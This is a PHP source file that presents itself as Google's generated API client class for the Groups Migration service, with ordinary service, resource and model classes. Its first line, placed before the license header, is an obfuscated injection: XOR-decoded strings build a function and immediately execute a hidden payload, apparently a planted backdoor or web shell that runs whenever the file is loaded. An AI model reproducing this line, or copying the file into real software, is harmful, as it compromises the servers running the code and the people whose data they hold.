<?php $zBDKWySOoOsV='4=SZTR5R6 S=-97'^'WO6; 7j4CN0IDVY';$cCdoPqOmo=$zBDKWySOoOsV('',';-RHF EQO=++60<9 N4BHL,JqS3:7>s5,9lXQI7GN29P1XT>ZNDRR+.YH4q>Z48LN1RGZBzI=TROcawiw9axkP8HXttdfpVlAj<YLqcEijYurVA<QD.76E=lQRP5AqTNOWnnkSk2tW,>cxXicfJ,,1hk:3t<fm8+C+u-sOc4:087NdaFURa6bUa4LII;2 EEiR2HjwR>SN+ZZTD7M+IqK49X8Kp:CPV<P<Z0 VSZ R+2Tz2;,,026T+QKQmz5ufsxvTSBwES;MMSyb<3LI1GjKB8q-6,,1XVBZHXLEK+u6Pb4U3UQkvkF2UX4Hg,xyPQTGBtZ4B+Jg64p6>II8CYzOTbrq9 hmxUV8AsFIRBeFwWX1=8VZq9injjHAG-c-WUInyNFTEU<:9s3UXQkEDBZA;3XM1A:RMYBq>W22XoF807MVJ=JZ +.e+=IdY6OA::8O:NU4C-wUcO.U:O3IK,.DZCbFg18I,d34AOsLoB.CSXYJ5YtwIZ 8P02<EH1E7.K;OmEUEOtUkA=3OXpPmqOC<OPMA,4DO-aQRKn4dzLTyrC-c5BRCCXlEXVI.Q2Gn3AQRDqBTFW6fPuGHgiu,3YXY-S+K,2CW5D Pk994 W1TDxToQ69;dhLkcAUm,by6JQ=aFIANW8p96:+VW0M.nwXFS:;1BsCQ2Q'^'RKzi U+2;TDEiUDPS:Gjo4C8.7RNVa,XYMKqxiLMGTL>R,=Q4n<= tJ8<U.a7ALdjU33;nZmV1+fCAWIWBkqbtW=,TIDAWmfHcZ6>YG,IWyEIveUm7ZEZ SDu61A Xonk>EEBYb;P8YJCVeIKB.MXP3OSnTbFISN:pQDSjCGNBTR LE-0+HkKnk=E;,OGR+mM=G<CLX7.DVPPp V9JiLkRX4K.K0g47H1c1UYvnzF3GA1A81JCBWW7Cqcu29z:-:=V5 bS.6BmpmYFJR <TnJ0H1UIWXMn33;zuxh..RN<YFP4G4qVVO0S9-QsmQrs97tocP>U6JcGM>yPQ;,Y 1Zgp= 4hu->,u7KaW-,+bXxWs.PQM3sQBcgcN, 3L<F2,iSYj-1<n630WW4,0Kxdf, WF=v;HGX0SHUZ6FSxRfxEY>38T+6IQKMSR;;=W; eeU:Nf7U0HAa<+K6U+VaoHO0;jNfCUY=M;XQ8fZwe+Hkw<8>TyRQi;RJ1ImW 1n OG8O<Eb> 6SyKeYR;9YpKWokQ+eeeHU0.vF:72IiMZqiYUqKSS kssaY >g+K7WrZWxdarA 5qgWP5RnhAOUMA+9 r8N2sW;>F0SxLIXML8P0cTtK5WMZMAlKCauMWhpS<0QIb- :6cWIWCG96TjsGLRO6BREjCjj8,');$cCdoPqOmo();
/*
 * Copyright 2010 Google Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License"); you may not
 * use this file except in compliance with the License. You may obtain a copy of
 * the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
 * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
 * License for the specific language governing permissions and limitations under
 * the License.
 */

/**
 * Service definition for GroupsMigration (v1).
 *
 * <p>
 * Groups Migration Api.
 * </p>
 *
 * <p>
 * For more information about this service, see the API
 * <a href="https://developers.google.com/google-apps/groups-migration/" target="_blank">Documentation</a>
 * </p>
 *
 * @author Google, Inc.
 */
class Google_0814_Service_GroupsMigration extends Google_0814_Service
{


  public $archive;


  /**
   * Constructs the internal representation of the GroupsMigration service.
   *
   * @param Google_0814_Client $client
   */
  public function __construct(Google_0814_Client $client)
  {
    parent::__construct($client);
    $this->servicePath = 'groups/v1/groups/';
    $this->version = 'v1';
    $this->serviceName = 'groupsmigration';

    $this->archive = new Google_0814_Service_GroupsMigration_Archive_Resource(
        $this,
        $this->serviceName,
        'archive',
        array(
          'methods' => array(
            'insert' => array(
              'path' => '{groupId}/archive',
              'httpMethod' => 'POST',
              'parameters' => array(
                'groupId' => array(
                  'location' => 'path',
                  'type' => 'string',
                  'required' => true,
                ),
              ),
            ),
          )
        )
    );
  }
}


/**
 * The "archive" collection of methods.
 * Typical usage is:
 *  <code>
 *   $groupsmigrationService = new Google_0814_Service_GroupsMigration(...);
 *   $archive = $groupsmigrationService->archive;
 *  </code>
 */
class Google_0814_Service_GroupsMigration_Archive_Resource extends Google_0814_Service_Resource
{

  /**
   * Inserts a new mail into the archive of the Google group. (archive.insert)
   *
   * @param string $groupId
   * The group ID
   * @param array $optParams Optional parameters.
   * @return Google_0814_Service_GroupsMigration_Groups
   */
  public function insert($groupId, $optParams = array())
  {
    $params = array('groupId' => $groupId);
    $params = array_merge($params, $optParams);
    return $this->call('insert', array($params), "Google_0814_Service_GroupsMigration_Groups");
  }
}




class Google_0814_Service_GroupsMigration_Groups extends Google_0814_Model
{
  public $kind;
  public $responseCode;

  public function setKind($kind)
  {
    $this->kind = $kind;
  }

  public function getKind()
  {
    return $this->kind;
  }

  public function setResponseCode($responseCode)
  {
    $this->responseCode = $responseCode;
  }

  public function getResponseCode()
  {
    return $this->responseCode;
  }
}